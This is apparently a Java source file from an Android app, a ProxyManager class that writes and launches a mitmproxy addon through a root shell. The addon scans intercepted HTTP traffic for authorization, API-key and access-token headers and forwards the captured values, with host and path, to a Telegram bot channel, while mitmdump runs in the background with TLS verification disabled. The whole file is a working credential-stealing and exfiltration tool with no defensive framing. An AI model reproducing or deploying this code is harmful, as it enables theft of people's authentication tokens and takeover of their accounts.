package com.tok.interceptor;

import android.content.Context;
import java.io.*;
import java.nio.charset.StandardCharsets;

public class ProxyManager {

    private final Context ctx;
    public static final int PORT = 8080;

    public ProxyManager(Context ctx) {
        this.ctx = ctx;
    }

    private File writeScript(String botToken, String channelId) throws Exception {
        String script =
            "import mitmproxy.http\n" +
            "import urllib.request, json, threading\n\n" +
            "BOT_TOKEN  = '" + botToken  + "'\n" +
            "CHANNEL_ID = '" + channelId + "'\n\n" +
            "TOKEN_HEADERS = [\n" +
            "    'authorization', 'x-auth-token',\n" +
            "    'x-access-token', 'x-api-key', 'token', 'bearer'\n" +
            "]\n\n" +
            "def send_tg(text):\n" +
            "    def _send():\n" +
            "        try:\n" +
            "            url  = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'\n" +
            "            data = json.dumps({\n" +
            "                'chat_id': CHANNEL_ID,\n" +
            "                'text': text,\n" +
            "                'parse_mode': 'Markdown'\n" +
            "            }).encode()\n" +
            "            req = urllib.request.Request(\n" +
            "                url, data=data,\n" +
            "                headers={'Content-Type': 'application/json'}\n" +
            "            )\n" +
            "            urllib.request.urlopen(req, timeout=10)\n" +
            "        except Exception as e:\n" +
            "            print(f'[TG ERROR] {e}')\n" +
            "    threading.Thread(target=_send, daemon=True).start()\n\n" +
            "class TokenInterceptor:\n" +
            "    def request(self, flow: mitmproxy.http.HTTPFlow):\n" +
            "        found = []\n" +
            "        for h, v in flow.request.headers.items():\n" +
            "            if h.lower() in TOKEN_HEADERS:\n" +
            "                found.append((h, v))\n\n" +
            "        if found:\n" +
            "            host = flow.request.pretty_host\n" +
            "            path = flow.request.path[:60]\n" +
            "            msg  = f'\\U0001f511 *Token Intercepted*\\n'\n" +
            "            msg += f'*Host:* `{host}`\\n'\n" +
            "            msg += f'*Path:* `{path}`\\n\\n'\n" +
            "            for h, v in found:\n" +
            "                val = v[:300] + ('...' if len(v) > 300 else '')\n" +
            "                msg += f'*{h}:*\\n`{val}`\\n'\n" +
            "            send_tg(msg)\n" +
            "            print(f'[INTERCEPT] {host}')\n\n" +
            "addons = [TokenInterceptor()]\n";

        File scriptFile = new File(ctx.getFilesDir(), "intercept.py");
        try (FileOutputStream fos = new FileOutputStream(scriptFile)) {
            fos.write(script.getBytes(StandardCharsets.UTF_8));
        }
        return scriptFile;
    }

    public void start(String botToken, String channelId) throws Exception {
        File script = writeScript(botToken, channelId);
        String logPath = ctx.getFilesDir() + "/mitm.log";
        String cmd = "mitmdump"
            + " --listen-host 127.0.0.1"
            + " --listen-port " + PORT
            + " --ssl-insecure"
            + " -s " + script.getAbsolutePath()
            + " > " + logPath + " 2>&1 &";
        RootShell.run(cmd);
    }

    public void stop() throws Exception {
        RootShell.run("pkill -f mitmdump");
    }

    public boolean isRunning() {
        try {
            String out = RootShell.run("pgrep -f mitmdump");
            return out != null && !out.trim().isEmpty();
        } catch (Exception e) {
            return false;
        }
    }

    public void installMitmdump() throws Exception {
        // install via pip if not present
        RootShell.run(
            "which mitmdump || pip3 install mitmproxy"
        );
    }
}
